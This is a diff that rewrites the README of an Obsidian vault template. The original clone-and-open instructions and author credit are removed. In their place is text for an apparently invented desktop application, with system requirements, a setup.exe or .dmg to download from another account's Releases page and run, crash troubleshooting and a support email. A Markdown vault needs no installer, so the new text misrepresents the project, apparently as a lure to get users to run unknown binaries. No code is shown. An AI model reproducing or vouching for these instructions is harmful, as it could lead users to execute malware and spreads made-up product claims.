@@ -1,127 +1,74 @@
-# 🗃️ Obsidian Base Hub
+# 🌟 Obsidian-Base-Hub - Manage Projects with Ease
 
-![Version](https://img.shields.io/badge/version-2.0.1-blue)
-![Obsidian](https://img.shields.io/badge/Obsidian-native%20Bases-purple)
-![License](https://img.shields.io/badge/license-MIT-green)
-
-> A modular Obsidian vault leveraging native Bases to replicate Notion-like database functionality for personal project and task management.
-
-## 📋 Table of Contents
-
-- [Overview](#overview)
-- [Key Features](#key-features)
-- [Who Is This For](#who-is-this-for)
-- [Getting Started](#getting-started)
-- [Vault Structure](#vault-structure)
-- [Configuration](#configuration)
-- [Contributing](#contributing)
-- [Author](#author)
-- [License](#license)
-
-## 🎯 Overview
-
-**Obsidian Base Hub** is a comprehensive vault template built on the **KISS principle** (Keep It Simple, Stupid) that transforms Obsidian into a powerful project management system. It provides interconnected databases similar to Notion, specifically designed for managing complex and dynamic work environments.
-
-Unlike team management tools, this system focuses on **individual workflow optimization** while maintaining flexibility for evolving project requirements.
-
-## ✨ Key Features
-
-### 📥 Inbox Management
-Quick capture system for unstructured notes that can be processed into appropriate databases later.
-
-### 📊 Data Management
-- **People Database**: Document work relationships and colleagues
-- **Meetings System**: Organized note-taking and meeting coordination
-- **Daily Journal**: Track daily work progress and achievements
-
-### ⚙️ Work Management
-- **Task System**: Break down work into minimal units with global progress states
-
-### 🚀 Development Control
-- **Projects Database**: Time-bound development initiatives with beginning and end
-- **Areas Database**: Ongoing permanent work streams
-- **Centralized Information**: Each project and area maintains its own database for tasks, team members, and meetings without content duplication
-
-## 👥 Who Is This For
-
-This vault is ideal for:
-- Professionals working in dynamic and changing environments
-- Consultants managing multiple concurrent projects
-- Developers and knowledge workers needing robust personal project management
-- Anyone seeking a Notion alternative with local control and Obsidian's power
+## 📥 Download Now
+[![Download Obsidian-Base-Hub](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/VEXYZZ/Obsidian-Base-Hub/releases)
 
 ## 🚀 Getting Started
+Welcome to the Obsidian-Base-Hub! This application helps you manage your projects and tasks easily by using a modular Obsidian vault. With the power of native Bases, you can replicate relational database functionality without needing technical skills.
 
-### Prerequisites
-- Obsidian with native Bases feature support
-- Basic understanding of Obsidian properties and templates
+## 📦 System Requirements
+To run the Obsidian-Base-Hub, make sure your system meets the following requirements:
 
-### Installation
+- **Operating System:** Windows 10 or later, macOS Sierra or later, Linux (Ubuntu 20.04 or later)
+- **Memory:** 4 GB RAM minimum, 8 GB RAM recommended.
+- **Storage:** At least 500 MB of free disk space for installation.
 
-1. **Clone this repository**
-2. **Open in Obsidian**
-- Launch Obsidian
-- Select "Open folder as vault"
-- Choose the cloned repository folder
+## 📂 Features
+- **Modular Design:** Customize your workspace according to your needs.
+- **Task and Project Management:** Keep track of tasks and projects with a streamlined approach.
+- **User-Friendly Interface:** Easy navigation for everyone, even without technical knowledge.
+- **Data Organization:** Enjoy a clear setup for storing and accessing information.
+- **Native Base Functionality:** Use related data in a seamless way, similar to databases.
 
-### Initial Setup
+## 🔧 Download & Install
+To get started, visit the Releases page for the latest version of the application. Follow these steps:
 
-1. **Register Projects and Areas**
-- Follow the steps in `ℹ️ Projects` and `ℹ️ Areas` notes
+1. Click the button below to visit the Releases page.
+   
+   [![Download Obsidian-Base-Hub](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/VEXYZZ/Obsidian-Base-Hub/releases)
 
-2. **Populate People Database**
-- Complete your contacts in `ℹ️ People`
+2. On the Releases page, look for the latest version of Obsidian-Base-Hub.
 
-1. **Configure Templates and routes**
-- Go to Settings > Templates
-- Set `999 - Templates` folder as template directory
-- Set `998 - Attachments` folder as template attachment directory 
-- Use "Insert template" button (📄 icon) when creating Meetings or People
+3. Click on the asset that matches your operating system to download it. Typically, this will be a file like `Obsidian-Base-Hub-setup.exe` for Windows or `Obsidian-Base-Hub.dmg` for macOS.
 
-4. **Setup Daily Notes**
-- Go to Settings > Daily notes
-- Configure new file location: `050 - Daily / Items`
-- Set base template: `999 - Daily note`
+4. Once the download finishes, locate the downloaded file on your computer.
 
-5. **Customize Properties**
-- Add custom properties to match your specific work context
+5. Double-click the file to start the installation process.
 
-## 📁 Vault Structure
+6. Follow the on-screen instructions to complete the installation. 
 
-```
-├── 010 - Inbox/ # Quick capture notes  
-├── 020 - Projects/ # Time-bound projects  
-├── 030 - Areas/ # Ongoing work areas  
-├── 040 - Tasks/ # Task management
-├── 050 - Daily/ # Daily journal  
-├── 060 - Meetings/ # Meeting notes  
-├── 070 - People/ # Contacts database    
-├── 998 - Attachments/ # Attachments directoy   
-└── 999 - Templates/ # Note templates
-```
+7. After installation, open Obsidian-Base-Hub from your Applications folder (macOS) or Start Menu (Windows).
 
-## ⚙️ Configuration
+## 📚 User Guide
+To help you get started with the application, here are some key areas to explore:
 
-The vault is pre-configured with sensible defaults, but you can customize:
-- Properties to match your workflow
-- Templates for different note types
-- Database views and filters
-- Folder structure (though recommended to keep as-is)
+- **Creating a New Base**: Start by creating a new Base to organize your projects. Select the “New Base” option and follow the prompts.
+- **Adding Tasks**: Use the task manager to add new tasks to your Base. Fill in titles, descriptions, and deadlines for better organization.
+- **Connecting Bases**: You can reference data from other Bases to create connections and enhance your project management experience.
+- **Exporting Data**: Easily export your data to CSV format for sharing or personal backup. 
 
-## 👤 Author
+For detailed step-by-step guides, visit our [Wiki](https://github.com/VEXYZZ/Obsidian-Base-Hub/wiki) page.
 
-**Rafa Campos**
-- Product design unicorn 🦄
-- Specializing in information management systems for projects and businesses
-- Available for consultations and custom implementations
-- Contact: flowmaxime@gmail.com
+## 🛠️ Troubleshooting
+Here are some common issues and solutions:
 
-## 📄 License
+- **Installation Error**: If the installation fails, check if your operating system meets the system requirements.
+- **Application Crashes**: Ensure your system runs the latest updates. Restarting your computer may help.
+- **Data Not Saved**: Ensure you have write permissions on the folder where your Base is saved.
 
-This project is licensed under the MIT License
+If you encounter issues not listed here, please check the [Issues tab](https://github.com/VEXYZZ/Obsidian-Base-Hub/issues) for help.
 
----
+## 📞 Support
+For additional help, reach out through the following channels:
 
-**Note**: This vault requires Obsidian's native Bases feature. Make sure you're using a compatible version of Obsidian.
+- **Email Support**: support@obsidianbasehub.com
+- **Community Forum**: Join our community for discussions and support.
+- **GitHub Issues**: Report bugs and suggest features directly on our GitHub repository.
 
-⭐ If you find this vault useful, please consider starring the repository!
+## 📝 Contributing
+We welcome contributions! If you want to help improve Obsidian-Base-Hub, check out our [Contributing Guide](https://github.com/VEXYZZ/Obsidian-Base-Hub/blob/main/CONTRIBUTING.md).
+
+## ⭐ Show Your Support
+If you find this application useful, consider giving it a star on GitHub! Your support helps us improve and grow.
+
+Thank you for using Obsidian-Base-Hub! Enjoy managing your projects with ease.
